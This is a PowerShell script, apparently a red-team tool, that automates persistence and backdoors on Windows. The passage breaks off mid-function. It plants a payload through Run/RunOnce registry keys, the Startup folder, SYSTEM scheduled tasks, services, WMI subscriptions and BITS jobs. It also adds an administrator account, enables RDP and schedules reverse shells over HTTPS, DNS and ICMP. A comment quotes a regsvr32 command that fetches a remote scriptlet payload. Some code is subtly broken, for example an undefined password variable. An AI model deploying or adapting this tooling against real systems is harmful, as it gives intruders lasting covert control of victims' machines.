<#
########################################################################
########################################################################
!!!!!!! IMPORTANT AND NECESSARY TO RUN THIS SCRIPT !!!!!!!   
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
########################################################################

.DESCRIPTION

Script for peristence deployment automation on Windows, tested on Windows 10. 

It contains 3 different parts:

* Discovery of the machine
    - Checks its Internet access
    - Checks if there is a proxy configured
    - Checks if the user is root or sudoer
    - Checks if the process is elevated
* Persistence deployment
    - download file from the Internet
    - copy the file to another location
    - add user
    - Startup Folders
    - Registry
    - Scheduled Tasks
    - Services (if admin)
    - WMI
    - Bits JOB
* Backdoor deployment
    - RDP
    - reverse shell tool

Also it checks if a configuration file exists (named "config.json") 
 searching for different parameters in JSON format.

Finally it displays info about the processes and the results obtained

.PARAMETERS 

These are the possible actions this script can execute:
   - protocols: HTTPS, DNS, ICMP
   - techniques: checkAdmin, downloadFile, copyFile, addUser, startupFolder, registry, 
        scheduledTask, service, wmi, bitsJob, rdp, toolHTTPS, toolDNS, toolICMP

########################################################################
#>


##############################################################
### Init
##############################################################

###### Default values for variables ######

# Environment config
$UserHome = ${Env:UserProfile}
$UserName = ${Env:UserName}
$TempFolder = ${Env:TMP}
#$CurrentPath = $pwd.Path
$CurrentPath = $PSScriptRoot

# Internet config
$URLToCheck = "www.uclm.es"
$IPToPing = "8.8.8.8"
$ProxySettings = ""

# Payload config
$PayloadName = "maltest.ps1"
$PayloadOrigPath = Join-Path $CurrentPath -ChildPath $PayloadName
$PayloadURL = ""
$PayloadPathToSave = Join-Path $TempFolder -ChildPath $PayloadName
$PayloadPreArgs = ""
$PayloadPostArgs = ""
$PayloadOutput = " | out-null"
$PayloadPath = "" # Set later
$PayloadLaunch = "" # Set later

# Adding user config
$AddedUserName = "ftp2"
$AddedUserPass = "winpassword"
$AddedUserArgs = "-PasswordNeverExpires"

# Registry config
$RegistryName = "regtest"

# Scheduled Tasks config
$SchedTaskTrigger = "-AtStartup"
$SchedTaskName = "schedTest"

# Service config
$ServiceName = "servname"
#$ServiceDesc = "Example service to test"

# WMI config
$WmiName = "testwmi"

# BITS Job config
$BitsJobName = "testbits"
$BitsJobRetry = 60

# This parameters are not needed in Windows right now
# External server config
# $ServerIPURL = "192.168.1.159"
# $ServerPort = 1234
# $ServerUser = ""

# RDP Config
 
# Commands for the backdoor tool
$HTTPSCommand = ""
$HTTPSCommandPreProxy = ""
$HTTPSCommandPostProxy = ""
$DNSCommand = ""
$ICMPCommand = ""   

# Functions to be executed
$ExcludedTechniques = @()
$IncludedTechniques = @("checkAdmin, downloadFile, copyFile, addUser, startupFolder, registry, scheduledTask, 
    service, wmi, bitsJob, rdp, toolHTTPS, toolDNS, toolICMP")
$ExcludedProtocols = @("DNS", "ICMP")
$ForceProtocols = @("HTTPS")
$FinalTechniques = @()  # Set later

# Remove progress bar for more speed 
$ProgressPreference = 'SilentlyContinue'

# Stop errors from displaying
$ErrorActionPreference = 'SilentlyContinue'

###### Config file ######

function Compare-Values ($origVal, $otherVal)
{
   if ($otherVal -and $otherVal.ToString().Trim()){
       return $otherVal
   } 
    
   return $origVal
}

$ConfigFile = Join-Path $CurrentPath -ChildPath "config.json"

if (Test-Path $ConfigFile)
{
    try
    {
        $JSONFile = Get-Content $ConfigFile | ConvertFrom-Json
    }
    catch 
    { 
         Write-Output "Configuration file cannot be read.`nEnding execution" 
         exit(0)
    }

    if ("envvars" -in $JSONFile.PSobject.Properties.Name) 
    {
        if ("userHome" -in $JSONFile.envvars.PSobject.Properties.Name) 
        {
            $UserHome = Compare-Values $UserHome $JSONFile.envvars.userHome
        }
        if ("userName" -in $JSONFile.envvars.PSobject.Properties.Name) 
        {
            $UserName = Compare-Values $UserName $JSONFile.envvars.userName
        }
        if ("scriptPath" -in $JSONFile.envvars.PSobject.Properties.Name) 
        {
            $CurrentPath = Compare-Values $CurrentPath $JSONFile.envvars.scriptPath
        }
        if ("tempPath" -in $JSONFile.envvars.PSobject.Properties.Name) 
        {
            $TempFolder = Compare-Values $TempFolder $JSONFile.envvars.tempPath
        }

    }
    if ("discovery" -in $JSONFile.PSobject.Properties.Name) 
    {
        if ("pingTestIP" -in $JSONFile.discovery.PSobject.Properties.Name) 
        {
            $IPToPing = Compare-Values $IPToPing $JSONFile.discovery.pingTestIP
        }
        if ("httpsTestUrl" -in $JSONFile.discovery.PSobject.Properties.Name) 
        {
            $URLToCheck = Compare-Values $URLToCheck $JSONFile.discovery.httpsTestUrl
        }
        if ("proxy" -in $JSONFile.discovery.PSobject.Properties.Name) 
        {
            $ProxySettings = Compare-Values $ProxySettings $JSONFile.discovery.proxy
        }
    }
    if ("payload" -in $JSONFile.PSobject.Properties.Name) 
    {
        if ("name" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadName = Compare-Values $PayloadName $JSONFile.payload.name
        }
        if ("path" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadOrigPath = Compare-Values $PayloadOrigPath $JSONFile.payload.path
        }
        if ("URL" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadURL = Compare-Values $PayloadURL $JSONFile.payload.URL
        }
        if ("pathToSave" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadPathToSave = Compare-Values $PayloadPathToSave $JSONFile.payload.pathToSave
        }
        if ("preArguments" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadPreArgs = Compare-Values $PayloadPreArgs $JSONFile.payload.preArguments
        }
        if ("postArguments" -in $JSONFile.payload.PSobject.Properties.Name) 
        {
            $PayloadPostArgs = Compare-Values $PayloadPostArgs $JSONFile.payload.postArguments
        }
    }
    if ("persistence" -in $JSONFile.PSobject.Properties.Name) 
    {
        if ("adduserName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $AddedUserName = Compare-Values $AddedUserName $JSONFile.persistence.adduserName
        }
        if ("adduserPass" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $AddedUserPass = Compare-Values $AddedUserPass $JSONFile.persistence.adduserPass
        }
        if ("adduserArgs" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $AddedUserArgs = Compare-Values $AddedUserArgs $JSONFile.persistence.adduserArgs
        }
        if ("schedTaskName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $SchedTaskName = Compare-Values $SchedTaskName $JSONFile.persistence.schedTaskName
        }
        if ("schedTaskTime" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $SchedTaskTrigger = Compare-Values $SchedTaskTrigger $JSONFile.persistence.schedTaskTime
        }
        if ("serviceName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $ServiceName = Compare-Values $ServiceName $JSONFile.persistence.serviceName
        }
        if ("regName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $RegistryName = Compare-Values $RegistryName $JSONFile.persistence.regName
        }
        if ("wmiName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $WmiName = Compare-Values $WmiName $JSONFile.persistence.wmiName
        }
        if ("bitsName" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $BitsJobName = Compare-Values $BitsJobName $JSONFile.persistence.bitsName
        }
        if ("bitsRetry" -in $JSONFile.persistence.PSobject.Properties.Name) 
        {
            $BitsJobRetry = Compare-Values $BitsJobRetry $JSONFile.persistence.bitsRetry
        }
    }
    if ("backdoors" -in $JSONFile.PSobject.Properties.Name) 
    {
        # this parameters are not needed in Windows right now 

        #  if ("serverIPURL" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        #  {
        #      $ServerIPURL = Compare-Values $ServerIPURL $JSONFile.backdoors.serverIPURL
        #  }
        #  if ("serverPort" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        #  {
        #      $ServerPort = Compare-Values $ServerPort $JSONFile.backdoors.serverPort
        #  }
        #  if ("serverUser" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        #  {
        #      $ServerUser = Compare-Values $ServerUser $JSONFile.backdoors.serverUser
        #  }
        if ("HTTPSCommand" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        {
            $HTTPSCommand = Compare-Values $HTTPSCommand $JSONFile.backdoors.HTTPSCommand
        }
        if ("HTTPSCommandPreProxy" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        {
            $HTTPSCommandPreProxy = Compare-Values $HTTPSCommandPreProxy $JSONFile.backdoors.HTTPSCommandPreProxy
        }
        if ("HTTPSCommandPostProxy" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        {
            $HTTPSCommandPostProxy = Compare-Values $HTTPSCommandPostProxy $JSONFile.backdoors.HTTPSCommandPostProxy
        }
        if ("DNSCommand" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        {
            $DNSCommand = Compare-Values $DNSCommand $JSONFile.backdoors.DNSCommand
        }
        if ("ICMPCommand" -in $JSONFile.backdoors.PSobject.Properties.Name) 
        {
            $ICMPCommand = Compare-Values $ICMPCommand $JSONFile.backdoors.ICMPCommand
        }
    }
    if ("preferences" -in $JSONFile.PSobject.Properties.Name) 
    {
        if ("excludedTechniques" -in $JSONFile.preferences.PSobject.Properties.Name) 
        {
            $excludedTechniques = Compare-Values $excludedTechniques $JSONFile.preferences.excludedTechniques
        }
        if ("includedTechniques" -in $JSONFile.preferences.PSobject.Properties.Name) 
        {
            $includedTechniques = Compare-Values $includedTechniques $JSONFile.preferences.includedTechniques
        }
        if ("excludedProtocols" -in $JSONFile.preferences.PSobject.Properties.Name) 
        {
            $excludedProtocols = Compare-Values $excludedProtocols $JSONFile.preferences.excludedProtocols
        }
        if ("forceProtocols" -in $JSONFile.preferences.PSobject.Properties.Name) 
        {
            $forceProtocols = Compare-Values $forceProtocols $JSONFile.preferences.forceProtocols
        }
    }    
} 
else
{
    Write-Output "Configuration file not found.`nEnding execution"
    exit(0)
}

###### Final variables ######

$usePayload = $true

if (-not $PayloadName)
{
    if ($PayloadOrigPath)
    {
        $PayloadName = Split-Path $PayloadOrigPath -leaf
    }
    elseif ($PayloadURL) 
    {
        $PayloadName = Split-Path $PayloadURL -leaf
    }
    else
    {
        $usePayload = $false
    }
}

if ($usePayload)
{
    if (-not $PayloadOrigPath)
    {
        $PayloadOrigPath = Join-Path -Path $CurrentPath -ChildPath $PayloadName
    }

    $PayloadPath = $PayloadOrigPath

    if ($PayloadPathToSave)
    {
        $PayloadPath = $PayloadPathToSave
    }

    $PayloadLaunch = $PayloadPath
    if ($PayloadPreArgs) 
    {
        $PayloadLaunch = -join($PayloadPreArgs, $PayloadPath) 
    }

    if ($PayloadPostArgs)
    {
        $PayloadLaunch += $PayloadPostArgs 
    }

}

###### Control variables ######

if (-not ("HTTPS" -in $ExcludedProtocols) -and 
    ("HTTPS" -in $ForceProtocols -or
    $HTTPSCommand -or
    $HTTPSCommandPreProxy ))
{
    $FinalTechniques += "HTTPS"
}

if (-not ("DNS" -in $ExcludedProtocols) -and 
    ("DNS" -in $ForceProtocols -or
    $DNSCommand ))
{
    $FinalTechniques += "DNS"
}

if (-not ("ICMP" -in $ExcludedProtocols) -and 
    ("ICMP" -in $ForceProtocols -or
    $ICMPCommand ))
{
    $FinalTechniques += "ICMP"
}

$execTech = @("checkAdmin", , "addUser", "startupFolder", "registry", "scheduledTask", "service", "wmi", "bitsJob","rdp")

if ($IncludedTechniques)
{
    $execTech = $IncludedTechniques
}
# additional techniques
$execTech += @("copyFile", "downloadFile", "toolHTTPS", "toolDNS", "toolICMP")

$execTech = $execTech | Where-Object { $ExcludedTechniques -notcontains $_ }

if (-not $usePayload)
{
    $newExclTech = @("copyFile", "downloadFile", "startupFolder", "registry", "scheduledTask", "service", "wmi", "bitsJob")
    $execTech = $execTech | Where-Object { $newExclTech -notcontains $_ }
}

$otherExclTech = @()

if ( -not $PayloadPathToSave) { $otherExclTech += "copyFile" }
if ( -not $PayloadURL) { $otherExclTech += "downloadFile" }
if ( -not $HTTPSCommand -and -not $HTTPSCommandPreProxy) { $otherExclTech += "toolHTTPS" }
if ( -not $DNSCommand) { $otherExclTech += "toolDNS" }
if ( -not $ICMPCommand) { $otherExclTech += "toolICMP" }

$FinalTechniques += $execTech | Where-Object { $otherExclTech -notcontains $_ }


###### Other functions ###### 

function Change-Message ([bool]$result)
{
    if ($result)
    {
        return "Successful"
    }
    else
    {
        return "Failed"
    }
}

##############################################################
### Discovery techniques
##############################################################

##### Computer information #####
#$sysinfo = Get-ComputerInfo

##### Internet access #####

function Check-HTTPS ([string]$URL , [string]$proxy = $null)
{
    ## This function checks if there is HTTPS connection trying to download a website. It is also proxy aware.

    try
    {
        $connectionHTTPS = $null

        if ($proxy)
        {
            $connectionHTTPS = Invoke-WebRequest "https://$URL" -MaximumRedirection 2 -ErrorAction SilentlyContinue -ProxyUseDefaultCredentials -Proxy $proxy |
                               Select-Object StatusCode,StatusDescription
        } 
        else
        {
            $connectionHTTPS = Invoke-WebRequest "https://$URL" -MaximumRedirection 2 -ErrorAction SilentlyContinue | Select-Object StatusCode,StatusDescription
        }
        
        return ($connectionHTTPS -and ($connectionHTTPS.StatusCode -ge 200) -and ($connectionHTTPS.StatusCode -lt 400))
    }
    catch { return $false }
}

function Check-DNS ([string]$URL)
{
    ## This function checks if there is DNS connection trying to resolve a given domain

    try
    {
        $connectDNS = Resolve-DnsName $URL -ErrorAction SilentlyContinue | Select-Object Name
        return ($null -ne $connectDNS.Name)
    }
    catch { return $false }
}

function Check-ICMP ([string]$PingIP)
{
    ## This function checks if there is ICMP connection executing the "ping" command with a given IP

    ## Initially it was being tested with "Test-Connection $IPToPing -Quiet", but this command is
    ##  too slow. That is why system "ping" is being used.

    try
    {
        $connectionICMP = New-Object System.Net.NetworkInformation.Ping
        $pingObtained = $connectionICMP.Send($PingIP, 2000) | Select-Object -Property Status 

        return ($pingObtained.Status -eq "Success")
    }
    catch { return $false }
}

function Get-Proxy
 { 
    ## This function checks if there is a configured proxy on the Registry

    ## If an array of proxies is found, this function only returns the first HTTP or HTTPS found, 
    ##  or null if none is found (socks proxies will not be returned with this function) 

    # Examples to test with
    # $proxies = "socks=127.0.0.1:1080"
    # $proxies = "https=127.0.0.1:55833;https=127.0.0.1:33855"

    $finalProxy = $null

    # For future improvements
    #$defaultProxy = [System.Net.WebProxy]::GetDefaultProxy() | select Address, Credentials
    #$netshProxy = netsh winhttp show proxy
    
    $registryProxy = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
    if ($registryProxy.ProxyEnable -eq 1)
    {
        $proxies = $registryProxy.ProxyServer
        

        if ($proxies -and $proxies -ilike "*=*")
        {
            $finalProxy = $proxies -replace "=","://" -split(';') -match 'http:' | Select-Object -First 1
        }

        else { $finalProxy = "http://" + $proxies }
    }        
    return $finalProxy
}


##### User and process permissions #####

function Check-IsAdmin
 {
    ## This function checks if the user is admin just looking into their groups, looking for the admin SID

    $getGroups = whoami /groups /fo csv | convertfrom-csv | where-object { $_.SID -eq "S-1-5-32-544" }
    return ($null -ne $getGroups)
}

  function Check-IsElevated
 {
    ## This function checks if the process is elevated obtaining the user that executed this process and checking its SID
    ## On Windows, if a process is elevated, the current user (for the process) will appear as Administrator
  
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    $elevated = $null -ne ([Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-String 'S-1-5-32-544')
    $elevatedOther = $false -ne ([Security.Principal.WindowsIdentity]::GetCurrent().Groups.IsWellKnown('BuiltinAdministratorsSid') -eq $true )    

    return ($elevated -or $elevatedOther)
 }
  

##############################################################
### Persistence techniques
##############################################################

##### Download file ##### 

function Download-File ([string]$fileURL, [string]$filePath)
{
    Invoke-WebRequest -Uri $fileURL -OutFile $filePath

    return $true
}

##### Copy file to new location ##### 

function Copy-File ([string]$filePath, [string]$fileNewPath)
{
    Copy-Item $filePath -Destination $fileNewPath

    return $true
}

##### Creating new user #####

function Create-User ([string]$usrName, [string]$usrPasswd, [bool]$noPasswd )
{
    if ($noPasswd) 
    {
        $securePasswd = ConvertTo-SecureString -String $usrPasswd
        New-LocalUser -Name $usrName  -Password $securePasswd
    }
    else 
    {
        New-LocalUser -Name $usrName  -NoPassword 
    }
    return $true
}

function Create-Admin ([string]$usrName, [string]$usrPasswd )
{
    $securePasswd = ConvertTo-SecureString -String $usrPasswd
    New-LocalUser -Name $usrName  -Password $securePasswd

    $sidAdmin = 'S-1-5-32-544' # Administrators SID, to make it multilanguage
    $objSIDAdmin = New-Object System.Security.Principal.SecurityIdentifier($sidAdmin)
    Add-LocalGroupMember -SID $objSIDAdmin -Member $usrName
    
    return $true
}


##### Startup Folders #####

function CopyTo-StartupFolder ([string]$filePath)
{
    ## Startup folders may not execute PowerShell or other script files because of the default execution policy.
    # Also, sometimes only ".bat" scripts execute in that folder 
    #$cmdCommand = 'cmd.exe /c PowerShell.exe -ExecutionPolicy ByPass -File $PayloadLaunch'

    $startupFolder = Join-Path ${$env:APPDATA} -ChildPath "\Microsoft\Windows\Start Menu\Programs\Startup\" | Join-Path -ChildPath $PayloadName
    
    return Copy-File $filePath $startupFolder
}

##### Registry #####

function Modify-RegistryAdmin ([string]$regName, [string]$payloadPathArgs)
{

    New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $regName -Value $payloadPathArgs

    New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 -PropertyType String -Name $regName -Value $payloadPathArgs
    return $true
}


function Modify-RegistryUser ([string]$regName, [string]$payloadPathArgs)
{

    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $regName -Value $payloadPathArgs
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $regName -Value $payloadPathArgs
    return $true

}

##### Scheduled Tasks #####
# Random note: Scheduled Tasks = Windows tasks (can be PowerShell or not)
#              Scheduled Jobs = Tasks that are PowerShell code, managed by PowerShell

function Set-SchedTask ([string]$payloadPathArgs, [bool]$isElevated, [string]$schedTrigger, [string]$schedName, [bool]$useGlobalVars = $false)
{
    # to force it to run now: schtasks /run /tn $schedName

    if ($useGlobalVars)
    {
        $schedName = $SchedTaskName
        $schedTrigger = $SchedTaskTrigger
    }

    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $payloadPathArgs"
    $trigger = New-ScheduledTaskTrigger $schedTrigger
    $privUser = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
    $sets = New-ScheduledTaskSettingsSet

    $schedtsk = $null

    if ($isElevated)
    {
        $schedtsk = New-ScheduledTask -Action $action -Trigger $trigger -Principal $privUser -Settings $sets
    }
    else
    {
        $schedtsk = New-ScheduledTask -Action $action -Trigger $trigger -Settings $sets
    }    

    Register-ScheduledTask $schedName -InputObject $schedtsk

    return $true
}
 
##### Services #####

function Create-Service ([string]$srvName, [string]$srvDesc, [string]$payloadPathArgs)
{
    New-Service -Name $srvName -BinaryPathName $payloadPathArgs -Description $srvDesc -StartupType Automatic
    sc start Persistence

   return $true

}

##### WMI #####

function Set-WMI ([string]$wmiSubName, [string]$payloadPathArgs )
{

    $FilterArgs = @{name=$wmiSubName;
                    EventNameSpace='root\CimV2';
                    QueryLanguage="WQL";
                    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
                    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
    $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
     
    $ConsumerArgs = @{name=$wmiSubName;
                    CommandLineTemplate=$payloadPathArgs;}
    $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
     
    $FilterToConsumerArgs = @{
            Filter = [Ref] $Filter;
            Consumer = [Ref] $Consumer;
        }
    $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

    return $true

}

##### BITS Jobs #####

# Future: bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"
#         bitsadmin /resume backdoor

function Set-RemoteBITSJob ([string]$bitsName, [string]$payloadWeb, [string]$payloadPathSave, [string]$bitsRetry)
{
    <# 
    ! Interacting with the “bitsadmin” requires Administrator level privileges.

    Instructions (from https://pentestlab.blog/2019/10/30/persistence-bits-jobs/):
        - the create parameter requires a name for the job
        - the addfile requires the remote location of the file and the local path
        - the SetNotifyCmdLine the command that will executed
        - the SetMinRetryDelay defines the time for the callback (in seconds)
        - The resume parameter will run the bits job.
    #>

    bitsadmin /create $bitsName
    bitsadmin /addfile $bitsName $payloadWeb $payloadPathSave

    bitsadmin /SetNotifyCmdLine $bitsName $payloadPathSave NUL
    bitsadmin /SetMinRetryDelay $bitsName $bitsRetry

    bitsadmin /resume $bitsName

    return $true

}

function Set-LocalBITSJob ([string]$bitsName, [string]$payloadOrgPath, [string]$payloadPathSave, [string]$bitsRetry)
{
    <# 
    ! Interacting with the “bitsadmin” requires Administrator level privileges.

    Instructions (from https://pentestlab.blog/2019/10/30/persistence-bits-jobs/):
        - the create parameter requires a name for the job
        - the addfile requires the first location of the file and the second path
        - the SetNotifyCmdLine the command that will executed
        - the SetMinRetryDelay defines the time for the callback (in seconds)
        - The resume parameter will run the bits job.
    #>

    bitsadmin /create $bitsName
    bitsadmin /addfile $bitsName $payloadOrgPath $payloadPathSave

    bitsadmin /SetNotifyCmdLine $bitsName $payloadPathSave NUL
    bitsadmin /SetMinRetryDelay $bitsName $bitsRetry

    bitsadmin /resume $bitsName

    return $true

}

function Set-BITSJobOnlyExec ([string]$bitsName, [string]$payloadPathArgs, [string]$bitsRetry)
{
    <# 

    ! Interacting with the “bitsadmin” requires Administrator level privileges.

    Instructions from https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1197-bits-jobs:
        
    #>

    bitsadmin /create $bitsName
    bitsadmin /addfile $bitsName %comspec% %temp%\cmd.exe

    bitsadmin /SetNotifyCmdLine $bitsName cmd.exe "\c $payloadPathArgs"
    bitsadmin /SetMinRetryDelay $bitsName $bitsRetry

    bitsadmin /resume $bitsName

    return $true

}

##############################################################
### Backdoor techniques
# Reverse shell techniques are added to new crontab jobs
##############################################################

##### RDP Backdoor ##### 
function Enable-RDP
{
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    return $true

}

##### Tool reverse shell #####

function Start-GenericShell ([string]$toolCoomand, [bool]$isElevated)
{
    return Set-SchedTask $toolCoomand $isElevated -useGlobalVars 
}

function Start-HTTPSShell ($proxy, [string]$httpCommand, [string]$httpPreCommand, [string]$httpPostCommand, [bool]$isElevated)
{
    $toolHttpsCommand = $httpCommand
    if ($proxy) {
        $toolHttpsCommand = -join($httpPreCommand, $proxy, $httpPostCommand)
    }

    return Start-GenericShell $toolHttpsCommand $isElevated
}



##############################################################
### Main function
##############################################################

function Main
{
    $finalOutput = "`n#########################################"
    $finalOutput += "`n ## Persistence deployment automation ## "
    $finalOutput += "`n#########################################`n"


    ##### Variables ##### 

    $proxy = $false
    $hasHTTPS = $false
    $hasDNS = $false
    $hasPing = $false
    
    $isAdmin = $false
    $isElevated = $false

   
    ##### Discovery #####
    
    $finalOutput += "* Discovery`n"

    if ("HTTPS" -in $FinalTechniques){
        if ($ProxySettings.Trim())
        {
            $proxy = $ProxySettings
        }
        else 
        {
            $proxy = Get-Proxy 
        }
        
        $hasHTTPS = Check-HTTPS $URLToCheck $proxy

        $finalOutput += -join("`n - Has proxy: ", $proxy)
        $finalOutput += -join("`n - Has HTTPS connection: ", $hasHTTPS) 
    }

    if ("DNS" -in $FinalTechniques)
    {
        $hasDNS = Check-DNS $URLToCheck
        $finalOutput += -join("`n - Has DNS connection: ", $hasDNS) 
    }

    if ("ICMP" -in $FinalTechniques)
    {
        $hasPing = Check-ICMP $IPToPing
        $finalOutput += -join("`n - Has ICMP connection: ", $hasPing) 
    }

    if ("checkAdmin" -in $FinalTechniques)
    {
        $isElevated = Check-IsElevated
        $isAdmin = Check-IsAdmin
        if (-not $isElevated -and $isAdmin -and "tryToElevate" -in $FinalTechniques)
        {
            # Future: try to elevate 
            # message if successful or not
        }

        $isElevated = Check-IsElevated
        $finalOutput += -join("`n - User with Admin privileges: ", $isAdmin) 
        $finalOutput += -join("`n - Process elevated: ", $isElevated) 
    }


    ##### Persistence and backdoors #####

    $finalOutput += "`n* Applied techniques:"
    $notBitsJob = $true

    if ($isElevated -and  "bitsJob" -in $FinalTechniques){

        if ("downloadFile" -in $FinalTechniques)
        {   
            $bitsDownloadedFile =  Set-RemoteBITSJob $bitsJobName $PayloadURL $PayloadPath $bitsJobRetry
            $finalOutput += -join('`n - BITS Job executed. File downloaded to path "', $PayloadPath,'": ', (Change-Message $bitsDownloadedFile))
        }

        if ("copyFile" -in $FinalTechniques)
        {
            $bitsCopiedFile = Set-LocalBITSJob $bitsJobName $PayloadOrigPath $PayloadPathToSave $bitsJobRetry
            $finalOutput += -join('`n - BITS Job executed. File copied to path "', $PayloadPath,'": ', (Change-Message $bitsCopiedFile))
        }

        $notBitsJob = $false
    }

    if ($notBitsJob)
    {
        if ("downloadFile" -in $FinalTechniques)
        {
            $downloadedFile =  Download-File $PayloadURL $PayloadPath
            $finalOutput += -join('`n - File downloaded to path "', $PayloadPath,'": ', (Change-Message $downloadedFile))
        }

        if ("copyFile" -in $FinalTechniques)
        {
            $copiedFile = Copy-File $PayloadOrigPath $PayloadPathToSave
            $finalOutput += -join('`n - File copied to path "', $PayloadPath,'": ', (Change-Message $copiedFile))
        }
    }

    
    # Root persistence

    if ($isElevated)
    {
        if ("addUser" -in $FinalTechniques)
        {
            $newUsr = Create-Admin $UserName $UserPassword
            $finalOutput += -join('`n - Creating administrator "', $UserName, '": ', (Change-Message $newUsr))
        }

        if ("registry" -in $FinalTechniques)
        {
            $regMod = Modify-RegistryAdmin $RegistryName $PayloadLaunch
            $finalOutput += -join('`n - Adding some keys in the Registry as a privileged user (HKLM): "', (Change-Message $regMod))
        }        

        if ("service" -in $FinalTechniques)
        {
            $srvExec = Create-Service $ServiceName $ServiceDesc $PayloadLaunch
            $finalOutput += -join('`n - Adding a service named "', $ServiceName, '": "', (Change-Message $srvExec))
        }

        if ("wmi" -in $FinalTechniques)
        {
            $wmiExec = Set-WMI $WmiName $PayloadLaunch
            $finalOutput += -join('`n - Creating a WMI Suscription event, named "', $WmiName,'", to launch on reboot: "', (Change-Message $wmiExec))
        }

        if ("bitsJob" -in $FinalTechniques)
        {
            $bitsExec = Set-BITSJobOnlyExec $BitsJobName $PayloadLaunch $BitsJobRetry
            $finalOutput += -join('`n - Creating a BITS Job, named "', $BitsJobName,'", to execute the payload: "', (Change-Message $bitsExec))
        }

        if ("rdp" -in $FinalTechniques)
        {
            $rdpEnable = Enable-RDP
            $finalOutput += -join('`n - Enabling RDP to allow remote access: "', (Change-Message $rdpEnable))
        }
    }

    # User persistence

    if ("addUser" -in $FinalTechniques)
    {
        $newUsr = Create-User $UserName $UserPassword $withoutPassword
        $finalOutput += -join('`n - Creating user "', $UserName, '": ', (Change-Message $newUsr))
    }

    if ("startupFolder" -in $FinalTechniques)
    {
        $startupCopy = CopyTo-StartupFolder $PayloadPath 
        $finalOutput += -join('`n - Adding the payload in the StartUp folder: "', (Change-Message $startupCopy))
    }

    if ("registry" -in $FinalTechniques)
    {
        $regMod = Modify-RegistryUser $RegistryName $PayloadLaunch
        $finalOutput += -join('`n - Adding some keys in the Registry (HKCU): "', (Change-Message $regMod))
    }

    if ("scheduledTask" -in $FinalTechniques)
    {
        $taskExec = Set-SchedTask $PayloadLaunch $isElevated $SchedTaskTrigger $SchedTaskName 

        if ($isElevated)
        {
           $finalOutput += -join('`n - Adding a privileged scheduled task named "', $SchedTaskName, '": "', (Change-Message $taskExec))
        }
        else 
        {
           $finalOutput += -join('`n - Adding a scheduled task named "', $SchedTaskName, '": "', (Change-Message $taskExec)) 
        }            
    }



    # Backdoors

    if ("toolHTTPS" -in $FinalTechniques -and $hasHTTPS)
    {
        $schedHTTP = Start-HTTPSShell $proxy $HTTPSCommand $HTTPSCommandPreProxy $HTTPSCommandPostProxy $isElevated
        $finalOutput += -join("`n - Adding a reverse shell via HTTPS as a scheduled task:", (Change-Message $schedHTTP))  
    }

    if ("toolDNS" -in $FinalTechniques -and $hasDNS)
    {
        $schedDNS = Start-GenericShell $DNSCommand $isElevated
        $finalOutput += -join("`n - Adding a reverse shell via DNS as a scheduled task:", (Change-Message $schedDNS))
    }

    if ("toolICMP" -in $FinalTechniques -and $hasPing)
    {
        $schedICMP = Start-GenericShell $ICMPCommand $isElevated
